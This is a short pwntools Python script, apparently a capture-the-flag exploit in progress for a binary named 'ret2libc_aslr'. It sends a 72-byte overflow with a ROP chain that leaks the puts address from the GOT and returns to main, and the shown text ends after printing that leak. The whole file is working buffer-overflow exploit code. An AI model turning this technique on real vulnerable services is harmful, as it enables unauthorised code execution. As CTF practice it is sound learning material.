from pwn import *

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF("./libc.so.6")

pop_rdi_ret = elf.symbols['pop_rdi_ret']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

print(pop_rdi_ret)
ret = 0x40101a

#p = remote('offsec.m0lecon.it', 13551)
p = process(elf.path)

#print(hex(elf.plt['puts']))  # puts@plt
#print(hex(elf.got['puts']))  # puts@got

offset = 72  # your confirmed offset

# pivot target (stack address from gdb)

p.recvuntil(b'wish: ')

# -------------------------
# STAGE 1 ROP CHAIN
# -------------------------
stage1 = flat(
    b'A'*offset,
    p64(ret),
    pop_rdi_ret,
    p64(puts_got), 
    p64(puts_plt), 
    p64(main)
    )

p.sendline(stage1)
#p.recvuntil(b"wish: ")                        # consume "Let me check..."
#print(p.recv(timeout=2))
#leaked = p.recvline().strip()
#leak_addr = u64(leaked.ljust(8, b'\x00'))

#stage1test = b"A"*72 + b"BBBBCCCCDDDD"
#p.sendline(stage1test)

leaked = p.recvline(timeout=2)
print("RAW leak:", leaked)

#print("Leaked puts:", hex(leak_addr))
